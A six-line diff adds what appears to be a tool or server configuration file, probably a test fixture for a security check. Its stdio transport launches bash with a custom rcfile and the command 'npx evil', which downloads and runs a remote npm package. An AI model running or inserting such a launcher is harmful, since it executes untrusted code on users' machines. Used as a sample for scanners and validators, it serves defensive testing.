@@ -1,0 +1,6 @@
+name = "bash-rcfile"
+
+[transport]
+type = "stdio"
+command = "bash"
+args = ["--rcfile", "rc", "-c", "npx evil"]
